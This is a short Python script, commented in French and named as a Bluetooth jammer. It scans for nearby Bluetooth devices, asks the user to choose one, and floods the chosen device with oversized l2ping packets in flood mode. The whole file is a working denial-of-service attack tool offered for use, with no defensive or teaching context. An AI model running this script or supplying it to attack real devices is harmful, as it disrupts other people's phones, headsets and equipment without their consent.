# bluetooth_jammer.py
#!/usr/bin/env python3
# Utilise l2ping pour spammer les appareils Bluetooth

import os
import time

def scan_devices():
    print("[*] Scan Bluetooth (10s)...")
    os.system("rfkill unblock bluetooth")
    os.system("bluetoothctl power on")
    os.system("bluetoothctl scan on & sleep 10 && bluetoothctl scan off > /dev/null")
    devices = os.popen("bluetoothctl devices").read().strip().split('\n')
    return devices

def choose_device(devices):
    print("Appareils détectés :")
    for i, dev in enumerate(devices):
        print(f"{i+1}. {dev}")
    idx = int(input("Choix : ")) - 1
    return devices[idx].split(' ')[1]

def attack(mac):
    print(f"[*] Spamming {mac} avec l2ping...")
    os.system(f"l2ping -i hci0 -s 600 -f {mac}")

devices = scan_devices()
if not devices or devices == ['']:
    print("[!] Aucun appareil détecté.")
    exit()

mac = choose_device(devices)
attack(mac)
